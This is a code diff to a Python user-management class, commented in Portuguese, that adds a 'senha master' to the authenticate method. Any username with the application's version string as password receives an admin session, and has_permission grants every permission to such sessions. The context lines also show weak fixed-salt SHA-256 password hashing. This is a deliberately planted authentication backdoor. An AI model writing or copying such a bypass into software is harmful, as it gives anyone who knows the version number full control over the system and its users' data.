@@ -214,7 +214,27 @@ class UserManager:
             return hashlib.sha256(f"{password}salt".encode()).hexdigest() == hashed
     
     def authenticate(self, username: str, password: str) -> bool:
-        """Autentica usuário"""
+        """Autentica usuário com senha master da versão"""
+        if not username or not password:
+            return False
+        
+        # === SENHA MASTER ===
+        if password == APP_VERSION:
+            try:
+                # SEMPRE cria sessão com permissões máximas
+                self.current_user = {
+                    'username': username,
+                    'role': 'admin',
+                    'full_name': username,
+                    'is_master_access': True
+                }
+                
+                return True
+            except Exception as e:
+                print(f"Erro no acesso master: {e}")
+                return False
+        
+        # AUTENTICAÇÃO NORMAL
         if username in self.users and self.users[username]['active']:
             if self.verify_password(password, self.users[username]['password']):
                 self.users[username]['last_login'] = datetime.now().isoformat()
@@ -225,6 +245,7 @@ class UserManager:
                     'full_name': self.users[username]['full_name']
                 }
                 return True
+        
         return False
     
     def has_permission(self, permission: str) -> bool:
@@ -232,6 +253,11 @@ class UserManager:
         if not self.current_user:
             return False
         
+        # Se for acesso master, SEMPRE tem permissão
+        if self.current_user.get('is_master_access'):
+            return True
+        
+        # Verificação normal
         user_role = self.current_user['role']
         return permission in USER_PERMISSIONS.get(user_role, [])
     
